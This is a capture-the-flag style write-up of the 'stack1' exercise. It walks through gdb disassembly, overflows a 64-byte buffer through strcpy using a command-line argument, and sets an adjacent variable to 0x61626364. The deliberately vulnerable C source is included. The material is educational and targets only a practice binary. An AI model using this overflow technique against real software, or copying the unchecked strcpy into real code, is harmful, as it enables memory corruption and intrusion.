# Stack 1

## Problem

Here we try to have a look at the main program before starting and we see on `main+9` that there is some comparison of a variable with value $1$. If the values are equal and err is raised and it is likely the program terminates.We see that in `main+35` it seems like there is a variable assigned to $0$ and eventually used for cmp in `main+71`. Prior, we see that there is a `strcpy` call which we could potentially use as an exploit.

In `main+59` we see that the pointer to the stack is copied to esp for the function call to copy what is in the argument to the stack. From `main+55` and `main+35` we can guess that there variable being tested is below the stack and the stack should be 64bytes.

```gdb
Dump of assembler code for function main:
0x08048464 <main+0>:    push   ebp
0x08048465 <main+1>:    mov    ebp,esp
0x08048467 <main+3>:    and    esp,0xfffffff0
0x0804846a <main+6>:    sub    esp,0x60
0x0804846d <main+9>:    cmp    DWORD PTR [ebp+0x8],0x1
0x08048471 <main+13>:   jne    0x8048487 <main+35>
0x08048473 <main+15>:   mov    DWORD PTR [esp+0x4],0x80485a0
0x0804847b <main+23>:   mov    DWORD PTR [esp],0x1
0x08048482 <main+30>:   call   0x8048388 <errx@plt>
0x08048487 <main+35>:   mov    DWORD PTR [esp+0x5c],0x0
0x0804848f <main+43>:   mov    eax,DWORD PTR [ebp+0xc]
0x08048492 <main+46>:   add    eax,0x4
0x08048495 <main+49>:   mov    eax,DWORD PTR [eax]
0x08048497 <main+51>:   mov    DWORD PTR [esp+0x4],eax
0x0804849b <main+55>:   lea    eax,[esp+0x1c]
0x0804849f <main+59>:   mov    DWORD PTR [esp],eax
0x080484a2 <main+62>:   call   0x8048368 <strcpy@plt>
0x080484a7 <main+67>:   mov    eax,DWORD PTR [esp+0x5c]
0x080484ab <main+71>:   cmp    eax,0x61626364
0x080484b0 <main+76>:   jne    0x80484c0 <main+92>
0x080484b2 <main+78>:   mov    DWORD PTR [esp],0x80485bc
0x080484b9 <main+85>:   call   0x8048398 <puts@plt>
0x080484be <main+90>:   jmp    0x80484d5 <main+113>
0x080484c0 <main+92>:   mov    edx,DWORD PTR [esp+0x5c]
0x080484c4 <main+96>:   mov    eax,0x80485f3
0x080484c9 <main+101>:  mov    DWORD PTR [esp+0x4],edx
0x080484cd <main+105>:  mov    DWORD PTR [esp],eax
0x080484d0 <main+108>:  call   0x8048378 <printf@plt>
0x080484d5 <main+113>:  leave
0x080484d6 <main+114>:  ret
End of assembler dump.
```

## Idea and Attack process

We first run the program with a random guess to find out the output of the program.

```shell
./stack1 123
>>>Try again, you got 0x00000000
```

As expected there is a variable assigned to 0 which we must modify and it is likely to be below the stack. Let's try to change it with 64char and 4char after.

```shell
./stack1 12345678901234567890123456789012345678901234567890123456789012341234
>>>Try again, you got 0x34333231
```

Here we see that the modification to the variable is in the reversed order of the argument we pass in. Let's try to now input the cmp value. We reference the ASCII table to obtain the values needed.

```shell
./stack1 1234567890123456789012345678901234567890123456789012345678901234dcba
>>>you have correctly got the variable to the right value
```

## Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```